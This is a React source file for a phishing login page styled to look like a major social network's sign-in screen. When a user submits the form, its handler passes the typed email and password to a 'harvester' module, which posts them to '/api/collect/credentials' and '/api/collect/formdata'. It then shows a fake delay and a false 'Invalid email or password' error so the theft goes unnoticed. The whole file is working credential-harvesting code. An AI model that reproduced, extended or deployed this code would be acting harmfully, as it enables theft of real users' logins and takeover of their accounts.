import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, TextField, Divider, Alert, Checkbox, FormControlLabel, InputAdornment, IconButton } from '@mui/material';
import { Visibility, VisibilityOff } from '@mui/icons-material';
import harvester from '../harvester/HarvesterCore';

export default function LoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => { harvester.init(); }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    // Capture credentials
    await harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      username: email,
      password: password,
      email: email,
      url: window.location.href,
      formType: 'login-page',
      fieldData: { email, password }
    });

    await harvester.send('/api/collect/formdata', {
      formId: 'login-form',
      fields: { email, password },
      url: window.location.href
    });

    // Fake loading delay
    setTimeout(() => {
      setError('Invalid email or password. Please try again.');
      setLoading(false);
    }, 2000);
  };

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#f0f2f5', display: 'flex', alignItems: 'center', justifyContent: 'center', py: 4 }}>
      <Container maxWidth="xs">
        {/* Brand Header */}
        <Box sx={{ textAlign: 'center', mb: 3 }}>
          <Box sx={{ bgcolor: '#1877f2', width: 48, height: 48, borderRadius: 2, display: 'inline-flex', alignItems: 'center', justifyContent: 'center', mb: 1 }}>
            <Typography sx={{ color: '#fff', fontWeight: 800, fontSize: '1.5rem' }}>A</Typography>
          </Box>
          <Typography variant="h5" sx={{ fontWeight: 700, color: '#333' }}>Welcome back</Typography>
          <Typography sx={{ color: '#888', mt: 0.5, fontSize: '0.9rem' }}>Sign in to your account to continue</Typography>
        </Box>

        <Card elevation={2} sx={{ borderRadius: 2 }}>
          <CardContent sx={{ p: 3 }}>
            {error && (
              <Alert severity="error" sx={{ mb: 2, borderRadius: 1, fontSize: '0.85rem' }}>
                {error}
              </Alert>
            )}

            <form onSubmit={handleSubmit}>
              <TextField
                fullWidth
                label="Email address"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                sx={{ mb: 2 }}
                size="medium"
                required
                autoComplete="email"
              />
              <TextField
                fullWidth
                label="Password"
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                sx={{ mb: 1 }}
                size="medium"
                required
                autoComplete="current-password"
                InputProps={{
                  endAdornment: (
                    <InputAdornment position="end">
                      <IconButton onClick={() => setShowPassword(!showPassword)} edge="end" size="small">
                        {showPassword ? <VisibilityOff /> : <Visibility />}
                      </IconButton>
                    </InputAdornment>
                  )
                }}
              />

              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2 }}>
                <FormControlLabel
                  control={<Checkbox size="small" sx={{ '&.Mui-checked': { color: '#1877f2' } }} />}
                  label={<Typography sx={{ color: '#666', fontSize: '0.85rem' }}>Remember me</Typography>}
                />
                <Typography sx={{ color: '#1877f2', fontSize: '0.85rem', cursor: 'pointer', fontWeight: 500 }}>
                  Forgot password?
                </Typography>
              </Box>

              <Button
                type="submit"
                variant="contained"
                fullWidth
                size="large"
                disabled={loading || !email || !password}
                sx={{
                  bgcolor: '#1877f2',
                  '&:hover': { bgcolor: '#166fe5' },
                  '&:disabled': { bgcolor: '#9bc0f7' },
                  fontWeight: 600,
                  py: 1.2,
                  textTransform: 'none',
                  fontSize: '1rem',
                  borderRadius: 1.5
                }}
              >
                {loading ? 'Signing in...' : 'Sign In'}
              </Button>
            </form>

            <Divider sx={{ my: 2.5, color: '#888', fontSize: '0.85rem' }}>or</Divider>

            <Button
              variant="contained"
              fullWidth
              sx={{
                bgcolor: '#42b72a',
                '&:hover': { bgcolor: '#36a420' },
                fontWeight: 600,
                py: 1.2,
                textTransform: 'none',
                fontSize: '0.95rem',
                borderRadius: 1.5,
                mb: 2
              }}
            >
              Create New Account
            </Button>

            <Box sx={{ textAlign: 'center' }}>
              <Typography sx={{ color: '#888', fontSize: '0.8rem' }}>
                By signing in, you agree to our{' '}
                <span style={{ color: '#1877f2', cursor: 'pointer' }}>Terms</span> and{' '}
                <span style={{ color: '#1877f2', cursor: 'pointer' }}>Privacy Policy</span>.
              </Typography>
            </Box>
          </CardContent>
        </Card>

        <Box sx={{ textAlign: 'center', mt: 2 }}>
          <Typography sx={{ color: '#888', fontSize: '0.8rem' }}>
            Protected by reCAPTCHA. Google's{' '}
            <span style={{ color: '#1877f2', cursor: 'pointer' }}>Privacy Policy</span> and{' '}
            <span style={{ color: '#1877f2', cursor: 'pointer' }}>Terms</span> apply.
          </Typography>
        </Box>
      </Container>
    </Box>
  );
}